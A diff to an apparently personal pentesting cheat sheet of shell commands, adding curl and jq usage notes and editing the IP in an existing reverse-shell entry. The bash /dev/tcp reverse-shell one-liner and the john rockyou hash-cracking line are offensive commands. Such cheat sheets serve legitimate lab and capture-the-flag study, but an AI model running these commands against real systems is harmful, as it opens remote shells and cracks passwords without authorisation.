@@ -35,7 +35,7 @@ base64
 bash
 ```
 - Simple but better shell than `sh`, commonly used
-- Use `bash -c "bash -i >& /dev/tcp/10.10.15.127/9090 0>&1"` for stable reverse shell
+- Use `bash -c "bash -i >& /dev/tcp/10.10.10.10/9090 0>&1"` for stable reverse shell
 ```sh
 binwalk
 ```
@@ -50,6 +50,17 @@ cat
 checksec
 ```
 - Check the properties of a binary file
+```sh
+curl -X GET http://admin:admin@host:port/ -b 'PHPSESSID=123' -A 'H4ck3r' -o output.txt
+```
+- Send web request via terminal
+- Use `-X <method>` to set request method
+- Use `-u <user>:<pass>` for basic HTTP auth, or use `user:pass@host`
+- Use `-b <cookie>` to set cookies
+- Use `-A <user-agent>` to use custom user agent
+- Use `-H <header>: <value>` to add any header
+- Use `-d <body>` to set the data body
+- Use `-o <file>` or `-O` to output to file
 ## D
 ```sh
 df
@@ -155,6 +166,10 @@ impacket-<package>
 john -w=/usr/share/wordlists/rockyou.txt <passhashfile>
 ```
 - John the ripper, brute force hashes for example
+```sh
+jq
+```
+- Pipe json into jq to print it with a nice format
 ## K
 ```sh
 kill
